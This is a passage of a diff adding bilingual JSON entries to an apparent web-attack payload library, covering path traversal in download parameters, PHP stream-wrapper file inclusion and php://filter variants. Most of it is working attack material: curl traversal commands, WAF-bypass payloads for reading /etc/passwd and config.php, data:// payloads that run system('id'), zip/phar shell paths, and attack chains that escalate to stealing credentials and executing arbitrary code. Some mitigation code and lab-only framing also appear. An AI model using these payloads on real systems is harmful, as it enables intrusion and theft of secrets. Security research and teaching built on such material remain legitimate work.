+          "en": "Reject colons and reserved stream syntax in filename validation, generate server-side object names, and validate uniformly under target filesystem semantics; keep upload directories non-executable. After the fix, replay all step-1 colon variants and confirm uniform rejection while normal uploads work."
+        },
+        "difficulty": "advanced"
+      },
+      "analysis": {
+        "zh": "确认标准是入口记录、最终对象名或类型与唯一 marker 结果形成可重复关联，正常文件对照保持原有结论。HTTP 200、500、文件名回显、WAF 告警或单次超时都不足以确认边界被突破。",
+        "en": "Confirmation requires that ingress records and the final object name or type correlate repeatably with the unique marker while the normal-file control keeps its expected result. HTTP 200 or 500, reflected filenames, WAF alerts, or a single timeout do not prove the boundary was crossed."
+      },
+      "review": {
+        "decision": "payload",
+        "rationale": "WAF2 批次3：按报告 WAF2-0058 候选1追加 NTFS 目录流命名绕过，把原 waf[6] 对照块内的目录流引用独立为可投递变体；原 7 条逐字节保留，新变体只追加末尾。"
+      }
+    },
+    {
+      "id": "file-download-path-normalization",
+      "name": {
+        "zh": "文件下载路径规范化差异",
+        "en": "File Download Path Normalization Differential"
+      },
+      "description": {
+        "zh": "下载参数在 URL 解码、分隔符折叠和根目录约束之间出现不一致。命令只操作 PAYLOADER_MARKER 和隔离夹具。",
+        "en": "File Download Path Normalization Differential narrows the legacy collection to one boundary: the download parameter is interpreted inconsistently across URL decoding, separator folding, and root confinement. Commands operate only on PAYLOADER_MARKER and isolated fixtures."
+      },
+      "category": {
+        "zh": "文件漏洞",
+        "en": "File Vulnerabilities"
+      },
+      "subCategory": {
+        "zh": "文件下载接口",
+        "en": "File Download Interfaces"
+      },
+      "tags": [
+        "file-download",
+        "path-normalization",
+        "traversal"
+      ],
+      "prerequisites": [
+        {
+          "zh": "已在隔离下载服务固定根目录约束，并备好 URL 解码与分隔符折叠的对照请求组。",
+          "en": "The isolated download service pins its root constraint, with URL-decoding and separator-folding contrast request sets ready."
+        },
+        {
+          "zh": "测试端点、请求数量、临时目录和回滚步骤已经明确，不使用生产文件或真实凭据。",
+          "en": "The endpoint, request count, temporary directory, and rollback steps are defined, with no production files or real credentials."
+        }
+      ],
+      "execution": [
+        {
+          "title": {
+            "zh": "文件下载路径规范化差异验证块 1",
+            "en": "File Download Path Normalization Differential Validation Block 1"
+          },
+          "command": "BASE=\"http://127.0.0.1:8080/download?file=\"\ncurl --fail --silent --show-error --max-time 3 \"${BASE}../outside/PAYLOADER_MARKER.txt\"\ncurl --fail --silent --show-error --max-time 3 \"${BASE}....//outside/PAYLOADER_MARKER.txt\"\ncurl --fail --silent --show-error --max-time 3 \"${BASE}%2e%2e/outside/PAYLOADER_MARKER.txt\"\ncurl --fail --silent --show-error --max-time 3 \"${BASE}%252e%252e%252foutside%252fPAYLOADER_MARKER.txt\"\ncurl --fail --silent --show-error --max-time 3 \"${BASE}..%5coutside%5cPAYLOADER_MARKER.txt\"\ncurl --fail --silent --show-error --max-time 3 \"${BASE}../fixtures/PAYLOADER_MARKER.txt\"\ncurl --fail --silent --show-error --max-time 3 \"${BASE}../documents/PAYLOADER_MARKER.txt\"",
+          "description": {
+            "zh": "对 download 参数依次施加 ../、....//、单次与双重编码、反斜杠五类遍历变体，并以 ../fixtures、../documents 两个常规路径作对照（共七次请求），验证一次解码、二次解码与分隔符折叠的不一致。",
+            "en": "Applies seven variants (../, ....//, single- and double-encoded, backslash) to the download parameter, exposing inconsistencies between single decoding, double decoding, and separator folding."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "BASE=\"http://127.0.0.1:8080/download?file=\"",
+              "explanation": {
+                "zh": "定义基线地址",
+                "en": "Defines the base URL"
+              },
+              "type": "control"
+            },
+            {
+              "part": "${BASE}../outside/PAYLOADER_MARKER.txt",
+              "explanation": {
+                "zh": "相对段遍历",
+                "en": "Dot-dot traversal"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "${BASE}%2e%2e/outside/PAYLOADER_MARKER.txt",
+              "explanation": {
+                "zh": "单次编码遍历",
+                "en": "Single-encoded traversal"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "${BASE}%252e%252e%252foutside%252fPAYLOADER_MARKER.txt",
+              "explanation": {
+                "zh": "双重编码遍历",
+                "en": "Double-encoded traversal"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "${BASE}..%5coutside%5cPAYLOADER_MARKER.txt",
+              "explanation": {
+                "zh": "反斜杠变体",
+                "en": "Backslash variant"
+              },
+              "type": "payload"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false
+        },
+        {
+          "title": {
+            "zh": "文件下载路径规范化差异验证块 2",
+            "en": "File Download Path Normalization Differential Validation Block 2"
+          },
+          "command": "?file=%252e%252e%252foutside%252fPAYLOADER_MARKER.txt\n?file=%252e%252e%255coutside%255cPAYLOADER_MARKER.txt\n\n?file=%2e%2e%2foutside%2fPAYLOADER_MARKER.txt\n?file=....//outside/PAYLOADER_MARKER.txt\n?file=..%5coutside%5cPAYLOADER_MARKER.txt",
+          "description": {
+            "zh": "以纯查询串形式重放双重编码与反斜杠变体，对照 curl 场景验证不同入口的解码顺序差异。",
+            "en": "Replays double-encoded and backslash variants as raw query strings, contrasting with the curl cases to show decoding-order differences across entry points."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "?file=%252e%252e%252foutside%252fPAYLOADER_MARKER.txt",
+              "explanation": {
+                "zh": "双重编码查询",
+                "en": "Double-encoded query"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "?file=..%5coutside%5cPAYLOADER_MARKER.txt",
+              "explanation": {
+                "zh": "反斜杠查询",
+                "en": "Backslash query"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "?file=....//outside/PAYLOADER_MARKER.txt",
+              "explanation": {
+                "zh": "折叠绕过变体",
+                "en": "Filter-fold variant"
+              },
+              "type": "payload"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false
+        }
+      ],
+      "opsecTips": [
+        {
+          "zh": "只使用随机文本 marker、localhost 或 example.invalid，并限制每个变体的请求数和超时。",
+          "en": "Use only random text markers, localhost, or example.invalid, and cap request count and timeout for each variant."
+        },
+        {
+          "zh": "结束后删除临时文件、归档、对象和任务记录，并确认没有队列、文件句柄或下游处理残留。",
+          "en": "Delete temporary files, archives, objects, and test jobs, and verify no queue, file handle, or downstream processing remains."
+        }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "双重编码遍历",
+            "en": "Double-encoded traversal"
+          },
+          "command": "?file=%252e%252e%252fetc%252fpasswd",
+          "description": {
+            "zh": "双重解码后还原 ../。判据：返回 passwd 内容。失效条件：仅对做二次 URL 解码的架构成立。",
+            "en": "Double decoding restores ../. Success: passwd returned. Fails when: only holds on architectures that perform a second URL decode."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "?file=",
+              "explanation": {
+                "zh": "下载参数名",
+                "en": "Download param name"
+              },
+              "type": "value"
+            },
+            {
+              "part": "%252e%252e%252fetc%252fpasswd",
+              "explanation": {
+                "zh": "双重编码 passwd",
+                "en": "Double-encoded passwd"
+              },
+              "type": "payload"
+            }
+          ],
+          "effectiveness": "C"
+        },
+        {
+          "title": {
+            "zh": "双写点斜杠",
+            "en": "Doubled dot-slash"
+          },
+          "command": "?file=....//....//etc/passwd",
+          "description": {
+            "zh": "过滤剥离一次 ../ 后仍余遍历。判据：读出目标文件。",
+            "en": "Stripping one pass still leaves traversal. Success: file read."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "?file=",
+              "explanation": {
+                "zh": "下载参数名",
+                "en": "Download param name"
+              },
+              "type": "value"
+            },
+            {
+              "part": "....//....//etc/passwd",
+              "explanation": {
+                "zh": "折叠遍历",
+                "en": "Folded traversal"
+              },
+              "type": "payload"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "分号路径参数",
+            "en": "Semicolon path parameter"
+          },
+          "command": "?file=/..;/etc/passwd",
+          "description": {
+            "zh": "代理剥离分号段后端仍遍历。判据：200 且含 root 行。",
+            "en": "Proxy strips ;params, backend traverses. Success: 200 with root line."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "?file=",
+              "explanation": {
+                "zh": "下载参数名",
+                "en": "Download param name"
+              },
+              "type": "value"
+            },
+            {
+              "part": "/..;/etc/passwd",
+              "explanation": {
+                "zh": "分号段遍历",
+                "en": "Semicolon segment traversal"
+              },
+              "type": "payload"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "反斜杠混合",
+            "en": "Backslash mixing"
+          },
+          "command": "?file=..%5c..%5c/etc/passwd",
+          "description": {
+            "zh": "编码反斜杠绕过仅匹配 / 的规则。判据：内容返回。",
+            "en": "Encoded backslashes dodge slash-only rules. Success: content returned."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "?file=",
+              "explanation": {
+                "zh": "下载参数名",
+                "en": "Download param name"
+              },
+              "type": "value"
+            },
+            {
+              "part": "..%5c..%5c/etc/passwd",
+              "explanation": {
+                "zh": "反斜杠遍历",
+                "en": "Backslash traversal"
+              },
+              "type": "payload"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "段式双编码遍历",
+            "en": "Segmented Double-Encoding Traversal"
+          },
+          "command": "?file=..%25%32%66..%25%32%66etc/passwd",
+          "description": {
+            "zh": "%25%32%66 经一次解码还原为 %2f、二次解码还原为 /，字面形态与常见 %252f、%252e 双重编码特征不同，用于绕过按等值特征编写的双重编码黑名单；仅当 WAF 与应用解码次数不一致时成立。命中判据：返回 passwd 内容且请求不含 %252e 与 %252f 字面。",
+            "en": "%25%32%66 decodes once to %2f and a second time to /, so its literal form differs from the common %252f and %252e double-encoding signatures and evades double-encoding blacklists built on those exact values; it only holds when the WAF and the application decode a different number of times. Success: passwd is returned while the request carries neither %252e nor %252f."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "?file=",
+              "explanation": {
+                "zh": "下载参数名",
+                "en": "Download parameter name"
+              },
+              "type": "value"
+            },
+            {
+              "part": "..%25%32%66..%25%32%66etc/passwd",
+              "explanation": {
+                "zh": "段式双编码遍历序列",
+                "en": "Segmented double-encoding traversal sequence"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "%25%32%66",
+              "explanation": {
+                "zh": "百分号与十六进制分段书写的斜杠",
+                "en": "Slash written as segmented percent-hex pairs"
+              },
+              "type": "operator"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false,
+          "kind": "bypass",
+          "effectiveness": "B"
+        }
+      ],
+      "attackChain": [
+        {
+          "title": {
+            "zh": "定位下载参数与正常文件",
+            "en": "Locate the download parameter"
+          },
+          "description": {
+            "zh": "请求正常文件下载记录响应形态与参数名，摸清入口行为与限制。命中判据：正常文件可以稳定重复下载，为后续深入利用打下基础。",
+            "en": "Download a normal file to capture response shape and parameter names. Success: normal downloads work reliably."
+          }
+        },
+        {
+          "title": {
+            "zh": "提交遍历与编码变体",
+            "en": "Fire traversal and encoding variants"
+          },
+          "description": {
+            "zh": "对下载参数施加 ../、....//、单双编码与反斜杠五类遍历变体，观察解码差异。命中判据：某变体返回根外文件内容。",
+            "en": "Apply ../, ....//, single/double encodings and backslash variants. Success: one variant returns outside files."
+          },
+          "payload": ""
+        },
+        {
+          "title": {
+            "zh": "查询串入口投递变形",
+            "en": "Retry mutations via query-string entry"
+          },
+          "description": {
+            "zh": "以纯查询串形式投递编码变体，测试不同入口对解码顺序的处理差异。命中判据：发现可利用的解码不一致点，并且重复提交时可以稳定复现该结果。",
+            "en": "Re-submit encoded variants as raw query strings to compare decoding order. Success: an exploitable mismatch appears."
+          },
+          "payload": "?file=%252e%252e%252foutside%252fPAYLOADER_MARKER.txt\n?file=%252e%252e%255coutside%255cPAYLOADER_MARKER.txt\n\n?file=%2e%2e%2foutside%2fPAYLOADER_MARKER.txt\n?file=....//outside/PAYLOADER_MARKER.txt\n?file=..%5coutside%5cPAYLOADER_MARKER.txt"
+        },
+        {
+          "title": {
+            "zh": "读取服务器敏感配置",
+            "en": "Read server-side secrets"
+          },
+          "description": {
+            "zh": "用命中的变体构造路径，读取服务器配置、凭据与源码文件并外带。命中判据：敏感内容成功返回响应，多次提交均能得到相同结果。",
+            "en": "Use the winning variant to pull configs, credentials and sources. Success: sensitive content returns."
+          }
+        }
+      ],
+      "references": [
+        "https://owasp.org/www-community/attacks/Path_Traversal",
+        "https://cwe.mitre.org/data/definitions/22.html"
+      ],
+      "tutorial": {
+        "overview": {
+          "zh": "文件下载路径规范化差异针对下载参数在 URL 解码、分隔符折叠和根目录约束之间不一致的场景。验证 ../、....//、单次与双重编码、反斜杠五类遍历变体加两个对照路径的解码与最终路径差异，以 marker 回读为准。",
+          "en": "The file-download path normalization differential targets download parameters inconsistent across URL decoding, separator folding, and root constraints. It contrasts decoding and final-path behavior across seven variants—../, ....//, double encoding, and backslashes—judged by marker read-back."
+        },
+        "vulnerability": {
+          "zh": "根因是下载参数在 URL 解码、分隔符折叠和根目录约束之间出现不一致；只有当差异使最终路径越过预期目录或类型边界时，风险才成立。",
+          "en": "The root cause is download parameters inconsistent across URL decoding, separator folding, and root constraints; risk holds only when the difference pushes the final path past an expected directory or type boundary."
+        },
+        "exploitation": {
+          "zh": "按第 1 步对 download 参数依次施加 ../、....//、单次与双重编码、反斜杠五类遍历变体并记录每次响应；命中判据为某一变体返回根目录外 PAYLOADER_MARKER.txt 的内容。再用第 2 步以纯查询串形式重放双重编码与反斜杠变体，对照 curl 场景验证不同入口的解码顺序差异；两条路径的命中都应记录最终解析路径作为证据。",
+          "en": "As in step 1, apply the seven variants—../, ....//, single and double encoding, backslashes—to the download parameter and record each response; a hit is any variant returning the out-of-root PAYLOADER_MARKER.txt content. Then replay the double-encoding and backslash variants as pure query strings per step 2, contrasting decoding-order differences between entry points; record the final resolved path for every hit as evidence."
+        },
+        "mitigation": {
+          "zh": "下载参数只做单一解码，统一规范化后在真实路径上强制根目录前缀校验，并推荐改用服务端对象标识而非用户可控路径。\n    Path root   = Paths.get(storageDir).toRealPath();\n    Path target = root.resolve(requested).normalize().toRealPath();\n    if (!target.startsWith(root))\n        throw new SecurityException(\"path escape\");",
+          "en": "Use server-side object identifiers, unify decoding and normalization, and enforce root-directory and scheme allowlists before opening files. After the fix, replay the step-1 and step-2 anomalous samples alongside normal samples and confirm markers no longer escape while legitimate downloads keep working."
+        },
+        "difficulty": "advanced"
+      },
+      "analysis": {
+        "zh": "确认标准是最终路径或处理器日志与唯一 marker 返回相互印证，正常路径和缺失 marker 对照均不命中。HTTP 200、500、文件名回显、WAF 告警或单次超时都不足以确认边界被突破。",
+        "en": "Confirmation requires that final-path or handler logs agree with the unique marker response while normal-path and missing-marker controls do not match. HTTP 200 or 500, reflected filenames, WAF alerts, or a single timeout do not prove the boundary was crossed."
+      },
+      "review": {
+        "decision": "payload",
+        "rationale": "WAF2 批次3：按报告 WAF2-0058 候选2追加段式双编码遍历，字面形态避开 %252f/%252e 等值签名；原 4 条逐字节保留，新变体只追加末尾。"
+      }
+    },
+    {
+      "id": "fileup-php-stream-wrapper-inclusion",
+      "name": {
+        "zh": "PHP Stream Wrapper 文件包含",
+        "en": "PHP Stream Wrapper File Inclusion"
+      },
+      "description": {
+        "zh": "使用 php、data、zip 与 phar wrapper 验证文件包含或读取参数是否允许非文件流、归档成员和序列化元数据进入 PHP 处理链。",
+        "en": "Uses php, data, zip, and phar wrappers to test whether inclusion or read parameters admit nonfile streams, archive members, or serialization metadata into PHP processing."
+      },
+      "category": {
+        "zh": "LFI/RFI文件包含",
+        "en": "LFI/RFI File Inclusion"
+      },
+      "subCategory": {
+        "zh": "运行时流与包装器综合",
+        "en": "Runtime Streams & Wrapper Misc"
+      },
+      "tags": [
+        "php",
+        "stream-wrapper",
+        "lfi",
+        "phar"
+      ],
+      "prerequisites": [
+        {
+          "zh": "目标由 PHP 处理并存在文件读取、包含或归档访问参数",
+          "en": "The target runs PHP and exposes a file-read, include, or archive-access parameter."
+        },
+        {
+          "zh": "可在隔离测试实例中控制无敏感资源和归档文件",
+          "en": "Nonsensitive resources and archives are controllable in an isolated test instance."
+        }
+      ],
+      "execution": [
+        {
+          "title": {
+            "zh": "PHP 流与归档 Wrapper",
+            "en": "PHP Stream and Archive Wrappers"
+          },
+          "command": "php://filter/convert.base64-encode/resource=/etc/passwd\nphp://filter/convert.base64-encode/resource=config.php\nphp://input\ndata://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==\ndata:text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==\nzip://shell.jpg%23shell.php\nphar://shell.phar/shell.php",
+          "description": {
+            "zh": "逐 wrapper、逐目标测试，并把系统文件、代码与归档全部替换为隔离的无害标记；data: 与 data:// 是不同解析路径。命中判据：各 wrapper 按预期返回 base64 源码或执行内联流内容。",
+            "en": "Test one wrapper and target at a time and replace system files, code, and archives with harmless isolated markers; data: and data:// exercise different parsing paths. Success check: each wrapper returns Base64 source or executes the inline stream as expected."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "php://filter/convert.base64-encode",
+              "explanation": {
+                "zh": "过滤器包装器前缀",
+                "en": "Filter wrapper prefix"
+              },
+              "type": "url"
+            },
+            {
+              "part": "php://input",
+              "explanation": {
+                "zh": "原始请求体流",
+                "en": "Raw request body stream"
+              },
+              "type": "url"
+            },
+            {
+              "part": "data:text/plain",
+              "explanation": {
+                "zh": "无斜杠data简式",
+                "en": "Slash-less data form"
+              },
+              "type": "url"
+            },
+            {
+              "part": "zip://shell.jpg%23shell.php",
+              "explanation": {
+                "zh": "图片扩展ZIP成员",
+                "en": "Image-extension ZIP member"
+              },
+              "type": "payload"
+            }
+          ],
+          "platform": "linux",
+          "requiresAdmin": false
+        }
+      ],
+      "opsecTips": [
+        {
+          "zh": "使用只含固定标记的测试文件/归档，不读取配置或提交可执行系统命令。",
+          "en": "Use test files and archives containing only fixed markers; do not read configuration or submit executable system commands."
+        },
+        {
+          "zh": "每次只验证一个 wrapper，并在结束后删除上传的测试归档和请求体缓存。",
+          "en": "Validate one wrapper at a time and remove uploaded test archives and request-body caches afterward."
+        }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "zlib 包装器读压缩源",
+            "en": "zlib Wrapper Compressed Read"
+          },
+          "command": "compress.zlib://config.php.gz",
+          "description": {
+            "zh": "绕过对 php://filter 前缀的封锁：借压缩包装器读取 gzip 编码源；解压后得到源码即成功。",
+            "en": "Read through the compression wrapper past php://filter blocks; decompressing the result yields the source."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "zlib://",
+              "explanation": {
+                "zh": "旧zlib包装器别名",
+                "en": "Legacy zlib wrapper alias"
+              },
+              "type": "url"
+            },
+            {
+              "part": "compress.zlib://",
+              "explanation": {
+                "zh": "压缩流包装器",
+                "en": "Compression stream wrapper"
+              },
+              "type": "url"
+            },
+            {
+              "part": "config.php",
+              "explanation": {
+                "zh": "目标配置文件",
+                "en": "Target config file"
+              },
+              "type": "value"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "过滤器链式叠加",
+            "en": "Chained Filter Stack"
+          },
+          "command": "php://filter/string.strip_tags|convert.base64-encode/resource=config.php",
+          "description": {
+            "zh": "绕过对 convert.base64 单段特征的规则：前置字符过滤器改变链形态；解码输出为源码即成功。",
+            "en": "Prepend a string filter to change the chain shape past single-segment signatures; a decoded source output confirms success."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "string.strip_tags",
+              "explanation": {
+                "zh": "去标签过滤器",
+                "en": "Strip-tags filter"
+              },
+              "type": "function"
+            },
+            {
+              "part": "convert.base64-encode",
+              "explanation": {
+                "zh": "Base64编码过滤器",
+                "en": "Base64 encoding filter"
+              },
+              "type": "function"
+            },
+            {
+              "part": "resource=config.php",
+              "explanation": {
+                "zh": "目标配置文件",
+                "en": "Target config file"
+              },
+              "type": "flag"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "资源路径编码",
+            "en": "Encoded Resource Path"
+          },
+          "command": "php://filter/convert.base64-encode/resource=%63%6f%6e%66%69%67%2e%70%68%70",
+          "description": {
+            "zh": "绕过对 config.php 明文资源名匹配：文件名百分号编码；Base64 解码得源码即成功。",
+            "en": "Percent-encode the resource filename past plaintext matching; decoding the output yields the source."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "php://filter/convert.base64-encode",
+              "explanation": {
+                "zh": "过滤器包装器前缀",
+                "en": "Filter wrapper prefix"
+              },
+              "type": "url"
+            },
+            {
+              "part": "%63%6f%6e%66%69%67%2e%70%68%70",
+              "explanation": {
+                "zh": "全编码的资源名",
+                "en": "Fully encoded filename"
+              },
+              "type": "payload"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "glob 包装器枚举绕过",
+            "en": "glob Wrapper Enumeration"
+          },
+          "command": "glob:///etc/pa*",
+          "description": {
+            "zh": "glob:// 是目录枚举流包装器，需应用对包含目标执行 opendir 遍历才产出结果，用枚举替代读取可绕过对文件读取函数与 /etc/passwd 内容特征的审计；仅当包含目标被当作目录遍历时可用。命中判据：响应出现 passwd 等文件名（枚举形态）而非文件内容。",
+            "en": "glob:// is a directory-enumeration stream wrapper that yields results only when the application runs an opendir traversal over the include target, so enumerating instead of reading evades audits keyed on file-read functions and /etc/passwd content signatures; usable only when the include target is traversed as a directory. Success: file names such as passwd appear in enumeration form rather than file contents."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "glob://",
+              "explanation": {
+                "zh": "PHP 目录枚举流包装器",
+                "en": "PHP directory-enumeration stream wrapper"
+              },
+              "type": "keyword"
+            },
+            {
+              "part": "/etc/pa*",
+              "explanation": {
+                "zh": "枚举通配模式",
+                "en": "Enumeration wildcard pattern"
+              },
+              "type": "payload"
+            }
+          ],
+          "platform": "linux",
+          "requiresAdmin": false,
+          "kind": "bypass",
+          "effectiveness": "B"
+        }
+      ],
+      "attackChain": [
+        {
+          "title": {
+            "zh": "确认进入的文件函数",
+            "en": "Confirm which file function is reached"
+          },
+          "description": {
+            "zh": "区分参数进入读取还是包含函数，用普通路径与伪协议探测响应差异，确定sink类型即选择对应wrapper组合。",
+            "en": "Tell whether the parameter hits a read or include function by probing paths and pseudo-protocols; the sink type picks the wrapper set."
+          },
+          "payload": "php://filter/convert.base64-encode/resource=/etc/passwd\nphp://filter/convert.base64-encode/resource=config.php\nphp://input\ndata://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==\ndata:text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==\nzip://shell.jpg%23shell.php\nphar://shell.phar/shell.php"
+        },
+        {
+          "title": {
+            "zh": "逐个测试流包装器",
+            "en": "Test stream wrappers one by one"
+          },
+          "description": {
+            "zh": "用执行区载荷依次提交php://filter、php://input与data流，各wrapper按预期返回编码内容或执行结果即确认可用面。",
+            "en": "Submit php://filter, php://input, and data streams per the execution payload; each behaving as expected maps the usable surface."
+          },
+          "payload": "php://filter/convert.base64-encode/resource=/etc/passwd\nphp://filter/convert.base64-encode/resource=config.php\nphp://input\ndata://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==\ndata:text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==\nzip://shell.jpg%23shell.php\nphar://shell.phar/shell.php"
+        },
+        {
+          "title": {
+            "zh": "组合input实现代码执行",
+            "en": "Combine php://input for execution"
+          },
+          "description": {
+            "zh": "把参数设为php://input并在请求体POST一段PHP代码，页面执行结果回显即从文件读取升级为任意代码执行。",
+            "en": "Set the parameter to php://input and POST PHP code in the body; execution output upgrades file read to arbitrary code execution."
+          },
+          "payload": ""
+        }
+      ],
+      "references": [
+        "https://www.php.net/manual/en/wrappers.php",
+        "https://owasp.org/www-community/attacks/Path_Traversal"
+      ],
+      "tutorial": {
+        "overview": {
+          "zh": "PHP Stream Wrapper 文件包含针对文件包含或读取参数允许非文件流、归档成员和序列化元数据进入 PHP 处理链的场景。验证 php、data、zip 与 phar 四类 wrapper 的读取与包含行为差异。",
+          "en": "PHP stream-wrapper file inclusion targets inclusion or read parameters letting non-file streams, archive members, and serialized metadata into the PHP processing chain. It contrasts read versus include behavior across the php, data, zip, and phar wrappers."
+        },
+        "vulnerability": {
+          "zh": "根因是用户输入直接进入 fopen、file_get_contents、include 或归档 API，且未限制 wrapper scheme 和目标；读取函数可能泄露源码，include 可能解释流内容，phar/zip 还可能跨入归档成员或对象元数据处理。",
+          "en": "The root cause is user input entering fopen, file_get_contents, include, or archive APIs directly without wrapper-scheme or target restrictions; read functions may leak source, include may interpret stream content, and phar/zip can additionally cross into archive members or object metadata handling."
+        },
+        "exploitation": {
+          "zh": "按第 1 步逐 wrapper、逐目标测试，并把系统文件、代码与归档全部替换为隔离的无害标记；先提交 php://filter base64 读取 marker 验证过滤器链，再测试 php://input、data:// 与 zip/phar 归档成员。命中判据为各 wrapper 按预期返回 base64 源码或执行内联流内容。注意 data: 与 data:// 是不同解析路径，分别提交；phar 命中时单独核对是否触发元数据处理。",
+          "en": "Test per wrapper and per target as in step 1, replacing all system files, code, and archives with isolated harmless markers; first submit php://filter Base64 reads against the marker to verify the filter chain, then test php://input, data://, and zip/phar archive members. A hit is each wrapper returning Base64 source or executing inline stream content as expected. Note that data: and data:// parse differently—submit both; on phar hits, separately check whether metadata processing triggers."
+        },
+        "mitigation": {
+          "zh": "用户输入不传给 include/require/fopen 等通用流 API；读取用服务端对象映射与固定根目录、只允许 file 资源；关闭 allow_url_include，上传目录不可执行：\n    $ref = $_GET['f'] ? '';\n    if (preg_match('#^[a-zA-Z][a-zA-Z0-9+.\\-]*://#', $ref)) exit('wrapper denied');\n    $path = realpath(FILES_ROOT . '/' . $ref);\n    if ($path === false || !str_starts_with($path, FILES_ROOT)) exit('denied');\n    readfile($path);",
+          "en": "Never pass user input to include/require; read files via server-side object mapping with a fixed root, allowing only file resources; disable unneeded allow_url_include, keep upload directories non-executable, and audit phar/zip handling and deserialization paths. After the fix, replay all step-1 wrappers."
+        },
+        "difficulty": "advanced"
+      },
+      "analysis": {
+        "zh": "应明确每行对应的 PHP API、配置前提与实际结果：源码读取、流解析、归档访问和代码解释是不同风险，不能合并评级。",
+        "en": "State the PHP API, configuration prerequisite, and actual result for each line. Source read, stream parsing, archive access, and code interpretation are distinct risks and should not share one severity automatically."
+      },
+      "review": {
+        "decision": "payload",
+        "rationale": "WAF2 批次3：按报告 WAF2-0059 候选1追加 glob 包装器枚举绕过，命令按本载荷裸包装器形态落位（去掉报告示例的 file 参数前缀）；原 3 条逐字节保留，新变体只追加末尾。"
+      }
+    },
+    {
+      "id": "fileup-lfi-filter-transform-boundary",
+      "name": {
+        "zh": "php://filter 转换过滤器变体",
+        "en": "php://filter Conversion Filter Variants"
+      },
+      "description": {
+        "zh": "使用 ROT13、字符集转换、压缩加 Base64 和无显式转换的 filter URI，验证过滤链实际输出及资源读取边界。",
+        "en": "Uses ROT13, character-set conversion, compression plus Base64, and a filter URI without an explicit transform to verify actual filter output and resource-read boundaries."
+      },
+      "category": {
+        "zh": "LFI/RFI文件包含",
+        "en": "LFI/RFI File Inclusion"
+      },
+      "subCategory": {
+        "zh": "PHP Filter 源码读取",
+        "en": "php://filter Source Read"
+      },
+      "tags": [
+        "lfi",
+        "php-filter",
+        "stream-filter",
+        "transformation"
+      ],
+      "prerequisites": [
+        {
+          "zh": "已确认目标文件 API 支持 PHP stream filter，并能记录实际加载的 filter 名称",
+          "en": "The target file API is confirmed to support PHP stream filters and the filters actually loaded can be observed."
+        },
+        {
+          "zh": "测试资源只包含已知 UTF-8 随机标记，可离线计算 ROT13、UTF-16 与压缩编码预期值",
+          "en": "The test resource contains only a known UTF-8 random marker whose ROT13, UTF-16, and compressed encodings can be calculated offline."
+        }
+      ],
+      "execution": [
+        {
+          "title": {
+            "zh": "Filter 转换与对照 URI",
+            "en": "Filter Transform and Control URIs"
+          },
+          "command": "php://filter/read=string.rot13/resource=index.php\nphp://filter/convert.iconv.utf-8.utf-16/resource=index.php\nphp://filter/zlib.deflate/convert.base64-encode/resource=index.php\nphp://filter/resource=index.php",
+          "description": {
+            "zh": "将 index.php 替换为隔离标记资源，按原顺序逐条执行并与离线预期字节比较；不得读取生产源码。命中判据：转换后字节与离线预期完全一致。",
+            "en": "Replace index.php with the isolated marker resource, execute each line in source order, and compare bytes with offline expectations; never read production source. Success check: the transformed bytes match the offline expectation exactly."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "string.rot13",
+              "explanation": {
+                "zh": "ROT13字符变换",
+                "en": "ROT13 character transform"
+              },
+              "type": "function"
+            },
+            {
+              "part": "convert.iconv.utf-8.utf-16",
+              "explanation": {
+                "zh": "字符集转换过滤器",
+                "en": "Charset conversion filter"
+              },
+              "type": "function"
+            },
+            {
+              "part": "zlib.deflate",
+              "explanation": {
+                "zh": "压缩输出过滤器",
+                "en": "Compression output filter"
+              },
+              "type": "function"
+            },
+            {
+              "part": "php://filter/resource=index.php",
+              "explanation": {
+                "zh": "无转换对照形式",
+                "en": "Filterless control form"
+              },
+              "type": "url"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false
+        }
+      ],
+      "opsecTips": [
+        {
+          "zh": "所有 resource 指向单个无敏感标记文件并限制响应大小；任何非标记文件访问立即停止",
+          "en": "Point every resource to one nonsensitive marker file and cap response size; stop immediately on any access to a nonmarker file."
+        },
+        {
+          "zh": "完成后删除离线转换产物、标记文件和响应副本，并清除 PHP/代理缓存",
+          "en": "After completion delete offline transform artifacts, the marker file, and response copies, and clear PHP and proxy caches."
+        }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "多重 iconv 级联",
+            "en": "Multi-Stage iconv Cascade"
+          },
+          "command": "php://filter/read=convert.iconv.utf-8.utf-16|convert.iconv.utf-16.utf-8/resource=index.php",
+          "description": {
